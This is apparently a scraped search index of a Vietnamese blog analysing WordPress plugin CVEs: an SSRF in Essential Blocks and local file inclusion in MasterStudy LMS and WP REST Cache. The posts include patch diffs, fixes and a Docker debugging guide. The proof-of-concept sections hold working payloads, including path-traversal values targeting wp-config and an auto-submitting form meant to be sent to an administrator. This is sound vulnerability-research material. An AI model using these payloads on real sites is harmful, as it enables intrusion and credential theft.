Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?loggedout=true\u0026wp_lang=en_US Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C3cc12be38f8f94048309b7fcd31bd2187065311afecea7df5a9f01f5a207072b; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C38f09626eae6d08f6cdb9cd1ce781da26c2acdd8ef2fd1822d84a6d76c6c95ad; wp-settings-time-4=1761017121 action=save_ai_generated_image\u0026admin_nonce=9433571df4\u0026prompt=abc\u0026image_url=http://127.0.0.1:8001/test Response: Result: Đọc file được lưu http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png bằng BurpSuite Nội dung đọc được từ local service\rInformation\rKhông thể đọc nội dung trên ở trình duyệt, vì nội dung trong ai-generated-abc-1761019403.png ('hello') không phù hợp với Content-Type: image/png trả về, nên trình duyệt render ra lỗi. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 5.7.1 của Essential Blocks for Gutenberg mắc lỗi SSRF do dùng wp_remote_get() tải URL không kiểm soát, cho phép user Author gửi request đến địa chỉ nội bộ. Bản vá 5.7.2 thay bằng wp_safe_remote_get(), thêm kiểm tra mã phản hồi, MIME hợp lệ và xác thực nội dung hình ảnh, giúp ngăn chặn SSRF. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rCập nhật ngay lên v5.7.2. Dùng wp_safe_remote_get() thay cho wp_remote_get(). Luôn xác thực phản hồi (HTTP code, MIME, nội dung). Giới hạn timeout, redirect và kích thước file. Kiểm tra dữ liệu đầu vào và quyền user cẩn thận. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Essential Blocks for Gutenberg Plugin \u003c= 5.7.1 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["Web"],"collections":null,"content":"Tiếp nối phần hướng dẫn cài đặt WordPress trên môi trường local ở bài viết trước, bài này sẽ hướng dẫn bạn thiết lập WordPress bằng Docker — một cách hiện đại, linh hoạt và dễ chia sẻ hơn. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:0:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#"},{"categories":["Web"],"collections":null,"content":"Why Use Docker?\rDocker cho phép bạn đóng gói toàn bộ môi trường chạy WordPress (PHP, MySQL, web server và mã nguồn) vào các container độc lập. Cách làm này mang lại nhiều lợi ích: Đồng nhất môi trường: Chạy giống nhau trên mọi máy, tránh lỗi “chạy được trên máy tôi”. Dễ cài đặt và tái tạo: Chỉ cần vài lệnh để khởi tạo hoặc reset toàn bộ hệ thống. Cách ly và an toàn: Mỗi container là một môi trường riêng, tránh xung đột phần mềm. Thuận tiện cho phát triển và debug: Có thể bật Xdebug, theo dõi log, hoặc chỉnh PHP mà không ảnh hưởng đến hệ thống chính. Dễ chia sẻ: Chỉ cần gửi file docker-compose.yml và các file cấu hình, người khác có thể khởi chạy cùng môi trường giống bạn — không cần cài đặt thủ công. Docker là giải pháp tối ưu để phát triển, thử nghiệm và cộng tác trên các dự án WordPress, đặc biệt hữu ích cho lập trình viên, nhóm làm việc hoặc người làm pentest muốn có môi trường nhất quán, dễ tái sử dụng. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:1:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#why-use-docker"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacker in Docker\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-wordpress-for-hacker-in-docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rTrước tiên, bạn cần cài đặt Docker. Công cụ này hỗ trợ trên nhiều hệ điều hành, mỗi nền tảng có cách cài đặt riêng. Xem hướng dẫn tại: https://www.docker.com/get-started/ Docker Compose\rThay vì chạy từng container thủ công bằng docker run, ta dùng Docker Compose để định nghĩa và quản lý nhiều container liên kết chỉ bằng một file cấu hình duy nhất (docker-compose.yml). Với WordPress, ta cần: Một container MySQL để lưu cơ sở dữ liệu. Một container WordPress (PHP + web server) để chạy mã nguồn. Nếu làm thủ công, bạn sẽ phải nhập nhiều lệnh và cấu hình phức tạp. Với Docker Compose, tất cả nằm trong một file YAML giúp: Dễ cài đặt: docker-compose up -d là có đủ WordPress + MySQL. Dễ chia sẻ: Người khác chỉ cần cùng file docker-compose.yml là chạy được. Dễ mở rộng: Thêm phpMyAdmin, Nginx, hoặc Xdebug chỉ cần vài dòng. Xem hướng dẫn cài Docker Compose tại: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#prerequisites"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rTrước tiên, bạn cần cài đặt Docker. Công cụ này hỗ trợ trên nhiều hệ điều hành, mỗi nền tảng có cách cài đặt riêng. Xem hướng dẫn tại: https://www.docker.com/get-started/ Docker Compose\rThay vì chạy từng container thủ công bằng docker run, ta dùng Docker Compose để định nghĩa và quản lý nhiều container liên kết chỉ bằng một file cấu hình duy nhất (docker-compose.yml). Với WordPress, ta cần: Một container MySQL để lưu cơ sở dữ liệu. Một container WordPress (PHP + web server) để chạy mã nguồn. Nếu làm thủ công, bạn sẽ phải nhập nhiều lệnh và cấu hình phức tạp. Với Docker Compose, tất cả nằm trong một file YAML giúp: Dễ cài đặt: docker-compose up -d là có đủ WordPress + MySQL. Dễ chia sẻ: Người khác chỉ cần cùng file docker-compose.yml là chạy được. Dễ mở rộng: Thêm phpMyAdmin, Nginx, hoặc Xdebug chỉ cần vài dòng. Xem hướng dẫn cài Docker Compose tại: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rTrước tiên, bạn cần cài đặt Docker. Công cụ này hỗ trợ trên nhiều hệ điều hành, mỗi nền tảng có cách cài đặt riêng. Xem hướng dẫn tại: https://www.docker.com/get-started/ Docker Compose\rThay vì chạy từng container thủ công bằng docker run, ta dùng Docker Compose để định nghĩa và quản lý nhiều container liên kết chỉ bằng một file cấu hình duy nhất (docker-compose.yml). Với WordPress, ta cần: Một container MySQL để lưu cơ sở dữ liệu. Một container WordPress (PHP + web server) để chạy mã nguồn. Nếu làm thủ công, bạn sẽ phải nhập nhiều lệnh và cấu hình phức tạp. Với Docker Compose, tất cả nằm trong một file YAML giúp: Dễ cài đặt: docker-compose up -d là có đủ WordPress + MySQL. Dễ chia sẻ: Người khác chỉ cần cùng file docker-compose.yml là chạy được. Dễ mở rộng: Thêm phpMyAdmin, Nginx, hoặc Xdebug chỉ cần vài dòng. Xem hướng dẫn cài Docker Compose tại: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker-compose"},{"categories":["Web"],"collections":null,"content":"Installing WordPress with Docker Compose and Xdebug\rPhần này hướng dẫn cài WordPress với Docker Compose, tích hợp Xdebug để debug trực tiếp trong VS Code. Cách này giúp bạn có môi trường phát triển đầy đủ, dễ gỡ lỗi và mở rộng. Cấu trúc thư mục: . ├── wordpress ├── docker-compose.yml ├── Dockerfile ├── php.ini └── .vscode └── launch.json ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:2","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#installing-wordpress-with-docker-compose-and-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Environment\rTạo thư mục mới để chứa toàn bộ cấu hình: mkdir wordpress-docker \u0026\u0026 cd wordpress-docker ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:3","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-environment"},{"categories":["Web"],"collections":null,"content":"Create Dockerfile\rImage WordPress mặc định chưa có Xdebug, nên ta mở rộng bằng Dockerfile. nano Dockerfile Nội dung: FROM wordpress:latest # Cài đặt Xdebug RUN pecl install xdebug \u0026\u0026 docker-php-ext-enable xdebug ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:4","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-dockerfile"},{"categories":["Web"],"collections":null,"content":"Create docker-compose.yml\rTạo file để cấu hình toàn bộ hệ thống: nano docker-compose.yml Nội dung: services: db: image: mysql:latest container_name: wp_db restart: always environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress volumes: - db_data:/var/lib/mysql wordpress: build: . container_name: wp_app depends_on: - db ports: - \"80:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - ./wordpress:/var/www/html - ./php.ini:/usr/local/etc/php/conf.d/php.ini volumes: db_data: Thông tin\rvolumes: dùng để lưu trữ dữ liệu và đồng bộ mã nguồn giữa máy thật và container. Giải thích: db_data:/var/lib/mysql Lưu dữ liệu MySQL bền vững, không mất khi xóa container. ./wordpress:/var/www/html Đồng bộ mã nguồn WordPress giữa máy và container, giúp sửa code trực tiếp. ./php.ini:/usr/local/etc/php/conf.d/php.ini Gắn file cấu hình PHP/Xdebug, dễ tùy chỉnh mà không cần rebuild image. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:5","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-docker-composeyml"},{"categories":["Web"],"collections":null,"content":"Create php.ini\rKích hoạt Xdebug và cấu hình PHP. nano php.ini Nội dung: zend_extension=xdebug xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=172.17.0.1 xdebug.client_port=9003 xdebug.log_level=0 upload_max_filesize = 64M post_max_size = 64M memory_limit = 128M max_execution_time = 300 max_input_time = 300 Giải thích: Các dòng xdebug.* giúp kết nối với VS Code khi debug. Các dòng sau tăng giới hạn upload và tài nguyên PHP. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:6","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-phpini"},{"categories":["Web"],"collections":null,"content":"Create VS Code Launch Configuration\rTạo file cấu hình VS Code để kết nối với Xdebug: mkdir .vscode \u0026\u0026 nano .vscode/launch.json Nội dung: ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:7","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-vs-code-launch-configuration"},{"categories":["Web"],"collections":null,"content":"Install VS Code Extension\rMở VS Code → Extensions (Ctrl + Shift + X) → Cài đặt: PHP Debug (by Xdebug) ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:8","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#install-vs-code-extension"},{"categories":["Web"],"collections":null,"content":"Run Docker Compose\rKhởi động hệ thống: docker-compose up -d Sau khi khởi chạy, truy cập http://localhost để cài đặt WordPress. Giờ bạn có thể đặt breakpoint trong file PHP và debug trực tiếp trên VS Code. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:9","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/#run-docker-compose"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress MasterStudy LMS Plugin.","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin MasterStudy LMS phiên bản ≤ 3.5.28 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-32141 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 3.5.28 Patched Versions: 3.5.29 CVSS severity: Low (8.8) Required Privilege: Contributor Product: WordPress MasterStudy LMS Plugin ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - MasterStudy LMS: 3.5.28 (vulnerable) và 3.5.29 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } Trong phiên bản lỗi, callback của shortcode stm_lms_courses_categories lấy trực tiếp giá trị style từ mảng $atts và truyền thẳng vào STM_LMS_Templates::stm_lms_load_vc_element() mà không có bất kỳ kiểm tra hay làm sạch đầu vào nào =\u003e LFI có thể xảy ra. Bản vá: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts, $tag ); $atts['style'] = basename( sanitize_file_name( $atts['style'] ) ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } Bản vá đã sanitize $atts['style'] bằng sanitize_file_name() đã loại bỏ chuỗi/ký tự không an toàn =\u003e ngăn chặn LFI. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rpublic static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) { extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path ); if ( ! file_exists( $element ) \u0026\u0026 strpos( $__template_name, 'style_' ) !== false ) { $element = str_replace( $__template_name, 'style_1', $element ); } if ( file_exists( $element ) ) { include $element; } else { echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' ); echo esc_html( ' ' . $element ); } } Hàm include() tại đây dùng biến $element do stm_lms_locate_vc_element() trả về và $__template_name (tức giá trị style từ shortcode) ảnh hưởng trực tiếp tới kết quả đó. Nếu style không được xác thực, attacker có thể ép include file tùy ý dẫn đến LFI. public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) { $located = false; foreach ( (array) $templates as $template ) { $folder = $template; if ( ! empty( $template_name ) ) { $template = $template_name; } if ( substr( $template, -4 ) !== '.php' ) { $template .= '.php'; } if ( empty( $custom_path ) ) { $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template; } } else { $located = locate_template( $custom_path ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/' . $custom_path . '.php'; } } if ( file_exists( $template_name ) ) { break; } } return apply_filters( 'stm_lms_locate_vc_element', $located, $templates ); } Hàm stm_lms_locate_vc_element() có nhiệm vụ xác định và trả về đường dẫn file template (.php) Nếu có $template_name, nó sẽ ghi đè tên template mặc định và đảm bảo tên file có phần mở rộng .php. Tên file sẽ làSTM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php Ví dụ với style=payload thì stm_lms_locate_vc_element() sẽ trả về: /srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo post với shortcode có attribute style chứa LFI payload POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1 Host: localhost {\"id\":260,\"content\":\"\u003c!-- wp:shortcode --\u003e\\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\\n\u003c!-- /wp:shortcode --\u003e\\n\\n\u003c!-- wp:paragraph --\u003e\\n\u003cp\u003e\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\"} Kết quả: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 3.5.28 của MasterStudy LMS cho phép LFI qua tham số style trong shortcode do không kiểm tra đầu vào trước khi include file. Bản vá 3.5.29 đã làm sạch giá trị này bằng sanitize_file_name() và basename(), ngăn chặn việc truy cập file ngoài ý muốn. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông bao giờ ghép trực tiếp input người dùng vào đường dẫn file. Luôn sanitize hoặc giới hạn giá trị bằng whitelist trước khi include. Xác thực đường dẫn thực tế để đảm bảo file nằm trong thư mục hợp lệ. Cập nhật lên v3.5.29 để loại bỏ lỗ hổng LFI. ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress MasterStudy LMS Plugin \u003c= 3.5.28 is vulnerable to Local File Inclusion ","date":"2025-10-21","objectID":"/vi/posts/2025-10-21-cve-2025-32141/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/vi/posts/2025-10-21-cve-2025-32141/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress WP REST Cache Plugin.","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin WP REST Cache phiên bản ≤ 2025.1.0 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-52716 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2025.1.0 Patched Versions: 2025.1.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress WP REST Cache Plugin ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP REST Cache: 2025.1.0 (vulnerable) và 2025.1.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } Trong phiên bản lỗi, $sub là giá trị trả về của filter_input() lấy giá trị từ tham số GET (?sub=...) trong URL với filter FILTER_SANITIZE_FULL_SPECIAL_CHARS dùng để esacape \"\u003c\u003e\u0026 và các ký tự với ASCII value dưới 32. Tức không bao gồm .(46) và /(47) $sub được concat vào chuỗi có '.php' sau cùng trước khi được include_once mà không có cơ chế bảo vệ trước LFI. Bản vá: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php'; if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } Bản vá đã thêm cơ chế kiểm tra vị trí file trước khi include, đảm bảo file được nạp chỉ nằm trong thư mục partials. Nếu phát hiện đường dẫn ra ngoài (do chuỗi như ../), plugin tự động chuyển về file mặc định an toàn. Nhờ đó, lỗ hổng LFI bị loại bỏ. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rsettings_page() được đăng ký làm callback của submenu add_submenu_page( 'options-general.php', 'WP REST Cache', 'WP REST Cache', $capability, 'wp-rest-cache', [ $this, 'settings_page', ] ); Tức khi truy cập endpoint GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1 thì settings_page() được gọi. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web có form, tự động gửi request với LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80//wp-admin/options-general.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"wp-rest-cache\"\u003e \u003cinput type=\"text\" name=\"sub\" value=\"/../../../../../../wp-cofnig\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rGửi link đến trang web cho admin hoặc người dùng có đặc quyền Cảnh báo Lỗ hổng này chỉ khai thác được trên Windows, vì hàm file_exists() xử lý đường dẫn khác nhau giữa hai hệ điều hành. Trên Linux, nếu đường dẫn chứa thư mục không tồn tại, hàm sẽ trả về false. Trong khi đó, trên Windows, cùng đường dẫn đó lại có thể trả về 